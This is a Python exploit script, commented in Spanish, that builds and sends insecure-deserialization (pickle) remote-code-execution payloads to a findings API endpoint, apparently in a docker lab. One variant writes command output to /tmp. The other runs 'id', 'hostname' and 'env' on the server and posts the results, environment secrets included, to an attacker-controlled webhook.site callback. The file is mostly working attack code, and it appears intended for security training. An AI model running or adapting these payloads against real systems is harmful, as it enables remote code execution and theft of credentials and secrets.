"""
A08:2025 — Vuln 1: Insecure Deserialization — Generador de payloads RCE

Variante A (básica) : escribe a /tmp/  — verificar en el contenedor uwsgi.
Variante B (OOB)    : exfiltra datos al servidor del atacante vía HTTP callback.

Uso:
    python A08_V1.py                             # imprime los dos payloads en base64
    python A08_V1.py --send <HOST> <TOKEN>       # envía las dos variantes secuencialmente
    python A08_V1.py --send <HOST> <TOKEN> -v A  # envía solo la variante indicada (A o B)
"""

import argparse
import base64
import pickle
import textwrap

# ---------------------------------------------------------------------------
# Variante A — básica (escribe a /tmp/, verificar con: docker compose exec uwsgi cat /tmp/pwned)
# ---------------------------------------------------------------------------
class PayloadA:
    def __reduce__(self):
        cmd = "id > /tmp/pwned && hostname >> /tmp/pwned"
        return (__import__("os").system, (cmd,))


# ---------------------------------------------------------------------------
# Variante B — Out-of-Band (OOB) HTTP callback
#
# El payload exfiltra id + variables de entorno a un servidor controlado
# por el atacante. Útil con servicios como https://webhook.site o
# https://app.interactsh.com (no requiere infraestructura propia).
#
# Pasos:
#   1. Obtener una URL única en https://webhook.site
#   2. Sustituir CALLBACK_URL antes de serializar
#   3. Enviar el payload — la respuesta llega al webhook con los datos
# ---------------------------------------------------------------------------
CALLBACK_URL = "https://webhook.site/<ID>"


class PayloadB:
    def __reduce__(self):
        script = textwrap.dedent(f"""\
            import subprocess, urllib.request, urllib.parse, os
            out = subprocess.check_output(
                "id && hostname && env",
                shell=True, stderr=subprocess.STDOUT
            ).decode(errors="replace")
            data = urllib.parse.urlencode({{"output": out}}).encode()
            req = urllib.request.Request("{CALLBACK_URL}", data=data, method="POST")
            try:
                urllib.request.urlopen(req, timeout=5)
            except Exception:
                pass
        """)
        return (__import__("os").system, (f"python3 -c '{script}'",))


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
def encode(payload_class):
    return base64.b64encode(pickle.dumps(payload_class())).decode()


def send_payload(host: str, token: str, payload_b64: str, label: str, hint: str = ""):
    """Envía un payload al endpoint vulnerable e imprime el resultado."""
    import urllib.request, urllib.error, json

    url = f"{host.rstrip('/')}/api/v2/findings//"
    body = json.dumps({"state": payload_b64}).encode()
    req = urllib.request.Request(
        url,
        data=body,
        headers={
            "Authorization": f"Token {token}",
            "Content-Type": "application/json",
        },
        method="POST",
    )
    print(f"\n[*] Enviando Variante {label} a {url}")
    try:
        with urllib.request.urlopen(req) as resp:
            print(f"[+] HTTP {resp.status} — ejecución disparada")
            if hint:
                print(f"[+] {hint}")
    except urllib.error.HTTPError as e:
        print(f"[-] HTTP {e.code}: {e.read().decode()}")
    except Exception as e:
        print(f"[-] Error de red: {e}")


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Generador de payloads RCE — A08 Vuln 1")
    parser.add_argument("--send", nargs=2, metavar=("HOST", "TOKEN"),
                        help="Enviar payload(s) al endpoint vulnerable")
    parser.add_argument("-v", "--variant", choices=["A", "B"],
                        default=None,
                        help="Variante a enviar (por defecto: las dos)")
    args = parser.parse_args()

    pa = encode(PayloadA)
    pb = encode(PayloadB)

    print("=" * 70)
    print("Variante A (básica — verificar con: docker compose exec uwsgi cat /tmp/pwned):")
    print(f"  {pa}")
    print()
    print(f"Variante B (OOB callback a {CALLBACK_URL}):")
    print(f"  Editar CALLBACK_URL en este script antes de usar")
    print(f"  {pb}")
    print("=" * 70)

    if args.send:
        host, token = args.send
        to_send = args.variant or "all"

        if to_send in ("A", "all"):
            send_payload(
                host, token, pa, label="A",
                hint="Verificar evidencia: docker compose exec uwsgi cat /tmp/pwned",
            )
        if to_send in ("B", "all"):
            send_payload(
                host, token, pb, label="B",
                hint=f"Datos exfiltrados al callback: {CALLBACK_URL}",
            )

